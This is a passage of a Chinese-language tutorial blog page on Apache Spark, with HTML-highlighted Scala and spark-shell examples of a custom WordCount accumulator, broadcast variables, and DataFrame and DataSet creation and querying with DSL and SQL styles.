class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark04_Acc_WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local"</span>).setAppName(<span class="string">"Acc"</span>)</span><br><span class="line">        <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparConf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"hello"</span>, <span class="string">"spark"</span>, <span class="string">"hello"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 累加器 : WordCount</span></span><br><span class="line">        <span class="comment">// 创建累加器对象</span></span><br><span class="line">        <span class="keyword">val</span> wcAcc = <span class="keyword">new</span> <span class="type">MyAccumulator</span>()</span><br><span class="line">        <span class="comment">// 向Spark进行注册</span></span><br><span class="line">        sc.register(wcAcc, <span class="string">"wordCountAcc"</span>)</span><br><span class="line"></span><br><span class="line">        rdd.foreach(</span><br><span class="line">            word =&gt; &#123;</span><br><span class="line">                <span class="comment">// 数据的累加（使用累加器）</span></span><br><span class="line">                wcAcc.add(word)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取累加器累加的结果</span></span><br><span class="line">        println(wcAcc.value)</span><br><span class="line"></span><br><span class="line">        sc.stop()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      自定义数据累加器：WordCount</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      1. 继承AccumulatorV2, 定义泛型</span></span><br><span class="line"><span class="comment">         IN : 累加器输入的数据类型 String</span></span><br><span class="line"><span class="comment">         OUT : 累加器返回的数据类型 mutable.Map[String, Long]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      2. 重写方法（6）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyAccumulator</span> <span class="keyword">extends</span> <span class="title">AccumulatorV2</span>[<span class="type">String</span>, mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]] </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> wcMap = mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否初始状态</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">isZero</span></span>: <span class="type">Boolean</span> = &#123;</span><br><span class="line">            wcMap.isEmpty</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">copy</span></span>(): <span class="type">AccumulatorV2</span>[<span class="type">String</span>, mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]] = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="type">MyAccumulator</span>()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">reset</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">            wcMap.clear()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取累加器需要计算的值</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(word: <span class="type">String</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">            <span class="keyword">val</span> newCnt = wcMap.getOrElse(word, <span class="number">0</span>L) + <span class="number">1</span></span><br><span class="line">            wcMap.update(word, newCnt)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Driver合并多个累加器</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">merge</span></span>(other: <span class="type">AccumulatorV2</span>[<span class="type">String</span>, mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">val</span> map1 = <span class="keyword">this</span>.wcMap</span><br><span class="line">            <span class="keyword">val</span> map2 = other.value</span><br><span class="line"></span><br><span class="line">            map2.foreach&#123;</span><br><span class="line">                <span class="keyword">case</span> ( word, count ) =&gt; &#123;</span><br><span class="line">                    <span class="keyword">val</span> newCount = map1.getOrElse(word, <span class="number">0</span>L) + count</span><br><span class="line">                    map1.update(word, newCount)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 累加器结果</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">value</span></span>: mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>] = &#123;</span><br><span class="line">            wcMap</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6、RDD广播变量">6、RDD广播变量</h2><p>广播变量用来高效分发较大的对象。向所有工作节点发送一个较大的只读值，以供一个或多个 Spark 操作使用。比如，如果你的应用需要向所有节点发送一个较大的只读查询表，广播变量用起来都很顺手。在多个并行操作中使用同一个变量，但是 Spark 会为每个任务分别发送</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">BroadcastVariablesTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> conf: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="string">"wc"</span>).setMaster(<span class="string">"local[*]"</span>)</span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line">    sc.setLogLevel(<span class="string">"WARN"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不使用广播变量</span></span><br><span class="line">    <span class="keyword">val</span> kvFruit: <span class="type">RDD</span>[(<span class="type">Int</span>, <span class="type">String</span>)] = sc.parallelize(<span class="type">List</span>((<span class="number">1</span>,<span class="string">"apple"</span>),(<span class="number">2</span>,<span class="string">"orange"</span>),(<span class="number">3</span>,<span class="string">"banana"</span>),(<span class="number">4</span>,<span class="string">"grape"</span>)))</span><br><span class="line">    <span class="keyword">val</span> fruitMap: collection.<span class="type">Map</span>[<span class="type">Int</span>, <span class="type">String</span>] =kvFruit.collectAsMap</span><br><span class="line">    <span class="comment">//scala.collection.Map[Int,String] = Map(2 -&gt; orange, 4 -&gt; grape, 1 -&gt; apple, 3 -&gt; banana)</span></span><br><span class="line">    <span class="keyword">val</span> fruitIds: <span class="type">RDD</span>[<span class="type">Int</span>] = sc.parallelize(<span class="type">List</span>(<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>))</span><br><span class="line">    <span class="comment">//根据水果编号取水果名称</span></span><br><span class="line">    <span class="keyword">val</span> fruitNames: <span class="type">RDD</span>[<span class="type">String</span>] = fruitIds.map(x=&gt;fruitMap(x))</span><br><span class="line">    fruitNames.foreach(println)</span><br><span class="line">    <span class="comment">//注意:以上代码看似一点问题没有,但是考虑到数据量如果较大,且Task数较多,</span></span><br><span class="line">    <span class="comment">//那么会导致,被各个Task共用到的fruitMap会被多次传输</span></span><br><span class="line">    <span class="comment">//应该要减少fruitMap的传输,一台机器上一个,被该台机器中的Task共用即可</span></span><br><span class="line">    <span class="comment">//如何做到?---使用广播变量</span></span><br><span class="line">    <span class="comment">//注意:广播变量的值不能被修改,如需修改可以将数据存到外部数据源,如MySQL、Redis</span></span><br><span class="line">    println(<span class="string">"====================="</span>)</span><br><span class="line">    <span class="keyword">val</span> <span class="type">BroadcastFruitMap</span>: <span class="type">Broadcast</span>[collection.<span class="type">Map</span>[<span class="type">Int</span>, <span class="type">String</span>]] = sc.broadcast(fruitMap)</span><br><span class="line">    <span class="keyword">val</span> fruitNames2: <span class="type">RDD</span>[<span class="type">String</span>] = fruitIds.map(x=&gt;<span class="type">BroadcastFruitMap</span>.value(x))</span><br><span class="line">    fruitNames2.foreach(println)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>三、Spark SQL</h1><h2 id="1、SparkSQL-概述">1、SparkSQL 概述</h2><blockquote><p>Spark SQL 是Spark 用于结构化数据(structured data)处理的 Spark 模块</p></blockquote><h3 id="1-1-SparkSQL的发展">1.1 SparkSQL的发展</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816205.jpg" alt></p><ul><li><p><strong>Hive</strong></p><p>Hive 实现了 SQL on Hadoop，使用 MapReduce 执行任务 简化了 MapReduce 任务。但Hive 的查询延迟比较高，原因是使用 MapReduce 做计算。</p></li><li><p><strong>Shark</strong></p><p>Shark 改写 Hive 的物理执行计划， 使用 Spark 代替 MapReduce 物理引擎 使用列式内存存储。以上两点使得 Shark 的查询效率很高。但是Shark 执行计划的生成严重依赖 Hive，想要增加新的优化非常困难；Hive 是进程级别的并行，Spark 是线程级别的并行，所以 Hive 中很多线程不安全的代码不适用于 Spark；由于以上问题，Shark 维护了 Hive 的一个分支，并且无法合并进主线，难以为继；在 2014 年 7 月 1 日的 Spark Summit 上，Databricks 宣布终止对 Shark 的开发，将重点放到 Spark SQL 上，但也因此发展出两个支线：SparkSQL 和 Hive on Spark</p><p>其中 SparkSQL 作为 Spark 生态的一员继续发展，而不再受限于 Hive，只是兼容 Hive；而Hive on Spark 是一个Hive 的发展计划，该计划将 Spark 作为Hive 的底层引擎之一，也就是说，Hive 将不再受限于一个引擎，可以采用 Map-Reduce、Tez、Spark 等引擎</p></li><li><p><strong>SparkSQL-DataFrame</strong></p><p>Spark SQL 执行计划和优化交给优化器 Catalyst；内建了一套简单的 SQL 解析器，可以不使用 HQL；还引入和 DataFrame 这样的 DSL API，完全可以不依赖任何 Hive 的组件。但是对于初期版本的 SparkSQL，依然有挺多问题，例如只能支持 SQL 的使用，不能很好的兼容命令式，入口不够统一等。</p></li><li><p><strong>SparkSQL-Dataset</strong></p><p>SparkSQL 在 1.6 时代，增加了一个新的 API，叫做 Dataset，Dataset 统一和结合了 SQL 的访问和命令式 API 的使用，这是一个划时代的进步。在 Dataset 中可以轻易的做到使用 SQL 查询并且筛选数据，然后使用命令式 API 进行探索式分析</p></li></ul><h3 id="1-2-Hive-and-SparkSQL">1.2 Hive and SparkSQL</h3><ul><li>Hive 是将 SQL 转为 MapReduce。</li><li>SparkSQL 可以理解成是将 SQL 解析成：“RDD + 优化” 再执行</li></ul><h3 id="1-3-SparkSQL-特点">1.3 SparkSQL 特点</h3><ul><li>易整合，无缝的整合了 SQL 查询和 Spark 编程</li><li>统一的数据访问，使用相同的方式连接不同的数据源</li><li>兼容 Hive，在已有的仓库上直接运行 SQL 或者 HiveQL</li><li>标准数据连接，通过 JDBC 或者 ODBC 来连接</li></ul><h3 id="1-4-DataFrame简介">1.4 DataFrame简介</h3><p>在 Spark 中，DataFrame 是一种以 RDD 为基础的分布式数据集，类似于传统数据库中的二维表格。<strong>DataFrame 与 RDD 的主要区别在于，前者带有 schema 元信息，即 DataFrame 所表示的二维表数据集的每一列都带有名称和类型</strong>。这使得 Spark SQL 得以洞察更多的结构信息，从而对藏于 DataFrame 背后的数据源以及作用于 DataFrame 之上的变换进行了针对性的优化，最终达到大幅提升运行时效率的目标。反观 RDD，由于无从得知所存数据元素的具体内部结构，Spark Core 只能在 stage 层面进行简单、通用的流水线优化。</p><p>DataFrame 的前身是 SchemaRDD，从 Spark 1.3.0 开始 SchemaRDD 更名为 DataFrame，并不再直接继承自 RDD，而是自己实现了 RDD 的绝大多数功能。同时，与Hive 类似，DataFrame 也支持嵌套数据类型（struct、array 和 map）。从 API 易用性的角度上看，DataFrame API 提供的是一套高层的关系操作，比函数式的 RDD API 要更加友好，门槛更低</p><p><strong>总结：DataFrame 就是一个分布式的表</strong>；<strong>DataFrame = RDD - 泛型 + SQL 的操作 + 优化</strong></p><h3 id="1-5-DataSet">1.5 DataSet</h3><p>DataSet 是分布式数据集合。DataSet 是Spark 1.6 中添加的一个新抽象，是DataFrame的一个扩展。它提供了RDD 的优势（强类型，使用强大的 lambda 函数的能力）以及SparkSQL 优化执行引擎的优点。DataSet 也可以使用功能性的转换（操作 map，flatMap，filter等等）</p><ul><li>DataSet 是DataFrame API 的一个扩展，是SparkSQL 最新的数据抽象</li><li>用户友好的 API 风格，既具有类型安全检查也具有DataFrame 的查询优化特性；</li><li>用样例类来对DataSet 中定义数据的结构信息，样例类中每个属性的名称直接映射到DataSet 中的字段名称；</li><li>DataSet 是强类型的。比如可以有 DataSet[Car]，DataSet[Person]</li><li>DataFrame 是DataSet 的特列，DataFrame=DataSet[Row] ，所以可以通过 as 方法将DataFrame 转换为DataSet。Row 是一个类型，跟 Car、Person 这些的类型一样，所有的表结构信息都用 Row 来表示。获取数据时需要指定顺序</li></ul><h3 id="1-6-RDD、DataFrame、DataSet-的区别">1.6 RDD、DataFrame、DataSet 的区别</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816206.jpg" alt></p><ul><li>RDD[Person]：以 Person 为类型参数，但不了解 其内部结构</li><li>DataFrame：提供了详细的结构信息 schema 列的名称和类型。这样看起来就像一张表了</li><li>DataSet[Person]：不光有 schema 信息，还有类型信息</li></ul><p><strong>总结</strong></p><ul><li><strong>DataFrame = RDD - 泛型 + Schema + SQL + 优化</strong></li><li><strong>DataSet = DataFrame + 泛型</strong></li><li><strong>DataSet = RDD + Schema + SQL + 优化</strong></li></ul><h2 id="2、SparkSQL-核心编程">2、SparkSQL 核心编程</h2><h3 id="2-1-概述-v2">2.1 概述</h3><ul><li><p>在 spark2.0 版本之前</p><p>SQLContext 是创建 DataFrame 和执行 SQL 的入口。HiveContext 通过 hive sql 语句操作 hive 表数据，兼容 hive 操作，hiveContext 继承自 SQLContext。</p></li><li><p>在 spark2.0 之后</p><p>这些都统一于 SparkSession，SparkSession 封装了 SqlContext 及 HiveContext；实现了 SQLContext 及 HiveContext 所有功能；通过 SparkSession 还可以获取到 SparkConetxt</p></li></ul><h3 id="2-2-创建-DataFrame-DataSet">2.2 创建 DataFrame/DataSet</h3><p><strong>读取文本文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =====读取文本文件</span></span><br><span class="line"><span class="comment"># 在本地创建一个文件，有 id、name、age 三列，用空格分隔，然后上传到 hdfs 上</span></span><br><span class="line">vim /root/person.txt</span><br><span class="line">1 zhangsan 20</span><br><span class="line">2 lisi 29</span><br><span class="line">3 wangwu 25</span><br><span class="line">4 zhaoliu 30</span><br><span class="line">5 tianqi 35</span><br><span class="line">6 kobe 40</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开 spark-shell</span></span><br><span class="line"><span class="comment"># 创建 RDD</span></span><br><span class="line">spark/bin/spark-shell</span><br><span class="line"><span class="comment"># RDD[Array[String]]</span></span><br><span class="line">val lineRDD= sc.textFile(<span class="string">"hdfs://node1:8020/person.txt"</span>).map(_.split(<span class="string">" "</span>)) </span><br><span class="line"><span class="comment"># 定义 case class(相当于表的 schema)</span></span><br><span class="line"><span class="keyword">case</span> class Person(id:Int, name:String, age:Int)</span><br><span class="line"><span class="comment"># 将 RDD 和 case class 关联</span></span><br><span class="line"><span class="comment"># RDD[Person]</span></span><br><span class="line">val personRDD = lineRDD.map(x =&gt; Person(x(0).toInt, x(1), x(2).toInt))</span><br><span class="line"><span class="comment"># 将 RDD 转换成 DataFrame</span></span><br><span class="line"><span class="comment"># DataFrame</span></span><br><span class="line">val personDF = personRDD.toDF</span><br><span class="line"><span class="comment"># 查看数据和 schema</span></span><br><span class="line">personDF.show</span><br><span class="line">personDF.printSchema</span><br><span class="line"><span class="comment"># 注册表</span></span><br><span class="line">personDF.createOrReplaceTempView(<span class="string">"t_person"</span>)</span><br><span class="line"><span class="comment"># 执行 SQL</span></span><br><span class="line">spark.sql(<span class="string">"select id,name from t_person where id &gt; 3"</span>).show</span><br><span class="line"><span class="comment"># 也可以通过 SparkSession 构建 DataFrame</span></span><br><span class="line">val dataFrame=spark.read.text(<span class="string">"hdfs://node1:8020/person.txt"</span>)</span><br><span class="line"><span class="comment">#注意：直接读取的文本文件没有完整schema信息</span></span><br><span class="line">dataFrame.show</span><br><span class="line">dataFrame.printSchema</span><br></pre></td></tr></table></figure><p><strong>读取 json 文件</strong>和<strong>读取 parquet 文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">val jsonDF= spark.read.json(<span class="string">"file:///resources/people.json"</span>)</span><br><span class="line"><span class="comment"># 接下来就可以使用 DataFrame 的函数操作</span></span><br><span class="line">jsonDF.show</span><br><span class="line"><span class="comment"># 注意：直接读取 json 文件有 schema 信息，因为 json 文件本身含有 Schema 信息，SparkSQL 可以自动解析</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 parquet 文件</span></span><br><span class="line">val parquetDF=spark.read.parquet(<span class="string">"file:///resources/users.parquet"</span>)</span><br><span class="line">parquetDF.show</span><br><span class="line"><span class="comment"># 注意：直接读取 parquet 文件有 schema 信息，因为 parquet 文件中保存了列的信息</span></span><br></pre></td></tr></table></figure><h3 id="2-3-两种查询风格：DSL-和-SQL">2.3 两种查询风格：DSL 和 SQL</h3><p>首先进行准备工作,先读取文件并转换为 DataFrame 或 DataSet</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">val lineRDD= sc.textFile("hdfs://node1:8020/person.txt").map(_.split(" "))</span><br><span class="line">case class Person(id:Int, name:String, age:Int)</span><br><span class="line">val personRDD = lineRDD.map(x =&gt; Person(x(0).toInt, x(1), x(2).toInt))</span><br><span class="line">val personDF = personRDD.toDF</span><br><span class="line">personDF.show</span><br><span class="line">//val personDS = personRDD.toDS</span><br><span class="line">//personDS.show</span><br></pre></td></tr></table></figure><p><strong>DSL 风格</strong>:SparkSQL 提供了一个领域特定语言(DSL)以方便操作结构化数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// 查看 name 字段的数据</span><br><span class="line">personDF.select(personDF.col(<span class="string">"name"</span>)).show</span><br><span class="line">personDF.select(personDF(<span class="string">"name"</span>)).show</span><br><span class="line">personDF.select(<span class="keyword">col</span>(<span class="string">"name"</span>)).show</span><br><span class="line">personDF.select(<span class="string">"name"</span>).show</span><br><span class="line"></span><br><span class="line">// 查看 <span class="keyword">name</span> 和 age 字段数据</span><br><span class="line">personDF.select(<span class="string">"name"</span>, <span class="string">"age"</span>).show</span><br><span class="line"></span><br><span class="line">// 查询所有的 <span class="keyword">name</span> 和 age，并将 age+<span class="number">1</span></span><br><span class="line">personDF.select(personDF.col(<span class="string">"name"</span>), personDF.col(<span class="string">"age"</span>) + <span class="number">1</span>).show</span><br><span class="line">personDF.select(personDF(<span class="string">"name"</span>), personDF(<span class="string">"age"</span>) + <span class="number">1</span>).show</span><br><span class="line">personDF.select(<span class="keyword">col</span>(<span class="string">"name"</span>), <span class="keyword">col</span>(<span class="string">"age"</span>) + <span class="number">1</span>).show</span><br><span class="line">personDF.select(<span class="string">"name"</span>,<span class="string">"age"</span>).show</span><br><span class="line">//personDF.select(<span class="string">"name"</span>, <span class="string">"age"</span>+<span class="number">1</span>).show</span><br><span class="line">personDF.select($<span class="string">"name"</span>,$<span class="string">"age"</span>,$<span class="string">"age"</span>+<span class="number">1</span>).show</span><br><span class="line"></span><br><span class="line">// 过滤 age 大于等于 <span class="number">25</span> 的，使用 filter 方法过滤</span><br><span class="line">personDF.filter(<span class="keyword">col</span>(<span class="string">"age"</span>) &gt;= <span class="number">25</span>).show</span><br><span class="line">personDF.filter($<span class="string">"age"</span> &gt;<span class="number">25</span>).show</span><br><span class="line"></span><br><span class="line">// 统计年龄大于 <span class="number">30</span> 的人数</span><br><span class="line">personDF.filter(<span class="keyword">col</span>(<span class="string">"age"</span>)&gt;<span class="number">30</span>).count()</span><br><span class="line">personDF.filter($<span class="string">"age"</span> &gt;<span class="number">30</span>).count()</span><br><span class="line"></span><br><span class="line">// 按年龄进行分组并统计相同年龄的人数</span><br><span class="line">personDF.groupBy(<span class="string">"age"</span>).count().show</span><br></pre></td></tr></table></figure><p><strong>SQL 风格</strong>：DataFrame 的一个强大之处就是我们可以将它看作是一个关系型数据表，然后可以通过在程序中使用 spark.sql() 来执行 SQL 查询，结果将作为一个 DataFrame 返回</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 如果想使用 SQL 风格的语法，需要将 DataFrame 注册成表,采用如下的方式</span><br><span class="line">personDF.createOrReplaceTempView("t_person")</span><br><span class="line">spark.sql("<span class="keyword">select</span> * <span class="keyword">from</span> t_person<span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 显示表的描述信息</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">desc</span> t_person<span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 查询年龄最大的前两名</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> * <span class="keyword">from</span> t_person <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">2</span><span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 查询年龄大于 30 的人的信息</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> * <span class="keyword">from</span> t_person <span class="keyword">where</span> age &gt; <span class="number">30</span> <span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 使用 SQL 风格完成 DSL 中的需求</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> <span class="keyword">name</span>, age + <span class="number">1</span> <span class="keyword">from</span> t_person<span class="string">").show</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> <span class="keyword">name</span>, age <span class="keyword">from</span> t_person <span class="keyword">where</span> age &gt; <span class="number">25</span><span class="string">").show</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> <span class="keyword">count</span>(age) <span class="keyword">from</span> t_person <span class="keyword">where</span> age &gt; <span class="number">30</span><span class="string">").show</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> age, <span class="keyword">count</span>(age) <span class="keyword">from</span> t_person <span class="keyword">group</span> <span class="keyword">by</span> age<span class="string">").show</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ul><li><strong>DataFrame 和 DataSet 都可以通过 RDD 来进行创建</strong>；</li><li><strong>也可以通过读取普通文本创建–注意:直接读取没有完整的约束,需要通过 RDD+Schema</strong>；</li><li><strong>通过 josn/parquet 会有完整的约束</strong>；</li><li><strong>不管是 DataFrame 还是 DataSet 都可以注册成表，之后就可以使用 SQL 进行查询了! 也可以使用 DSL</strong>!</li></ul><h3 id="2-4-RDD、DataFrame、DataSet-三者的关系">2.4 RDD、DataFrame、DataSet 三者的关系</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816207.png" alt></p><p><strong>共性：</strong></p><ul><li>RDD、DataFrame、DataSet 全都是 spark 平台下的分布式弹性数据集，为处理超大型数据提供便利;</li><li>三者都有惰性机制，在进行创建、转换，如 map 方法时，不会立即执行，只有在遇到Action 如 foreach 时，三者才会开始遍历运算;</li><li>三者有许多共同的函数，如 filter，排序等;</li><li>在对DataFrame 和Dataset 进行操作许多操作都需要这个包:<code>import spark.implicits._</code>（在创建好 SparkSession 对象后尽量直接导入）</li><li>三者都会根据 Spark 的内存情况自动缓存运算，这样即使数据量很大，也不用担心会内存溢出</li><li>三者都有 partition 的概念</li><li>DataFrame 和DataSet 均可使用模式匹配获取各个字段的值和类型</li></ul><p><strong>不同：</strong></p><ul><li>RDD，RDD 一般和 spark mllib 同时使用；RDD 不支持 sparksql 操作</li><li>DataFrame，与 RDD 和 Dataset 不同，DataFrame 每一行的类型固定为Row，每一列的值没法直接访问，只有通过解析才能获取各个字段的值；DataFrame 与DataSet 一般不与 spark mllib 同时使用；DataFrame 与DataSet 均支持 SparkSQL 的操作，比如 select，groupby 之类，还能注册临时表/视窗，进行 sql 语句操作；DataFrame 与DataSet 支持一些特别方便的保存方式，比如保存成 csv，可以带上表头，这样每一列的字段名一目了然(后面专门讲解)</li><li>DataSet，Dataset 和DataFrame 拥有完全相同的成员函数，区别只是每一行的数据类型不同；DataFrame 其实就是DataSet 的一个特例 <code>type DataFrame = Dataset[Row]</code>；DataFrame 也可以叫Dataset[Row],每一行的类型是 Row，不解析，每一行究竟有哪些字段，各个字段又是什么类型都无从得知，只能用上面提到的 getAS 方法或者共性中的第七条提到的模式匹配拿出特定字段。而Dataset 中，每一行是什么类型是不一定的，在自定义了 case class 之后可以很自由的获得每一行的信息</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 